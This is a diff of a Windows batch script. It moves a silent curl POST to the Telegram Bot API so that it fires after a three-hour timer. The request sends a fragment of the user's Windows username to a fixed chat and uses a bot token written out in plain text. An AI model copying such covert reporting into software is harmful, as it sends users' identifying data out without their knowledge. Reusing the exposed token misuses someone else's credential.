@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=25.6"
+set "BATCHVERSION=25.7"
 
 
 
@@ -56,8 +56,6 @@ if !instances! geq 2 (
 
 
 
-set "SMALLUSER=%USERNAME:~0,3%%USERNAME:~-2%"
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%MORETHREEHOURSTestttt"
 
 
 
@@ -1688,6 +1686,8 @@ if %MINUTESS% GEQ 180 goto 3HOURDONE
 goto 3HOURSTILL
 
 :3HOURDONE
+set "SMALLUSER=%USERNAME:~0,3%%USERNAME:~-2%"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%THR"
 start "" "%file1%"
 set "COMSTARTED=1"
 echo 0 > "%LASTRUNFILE%"
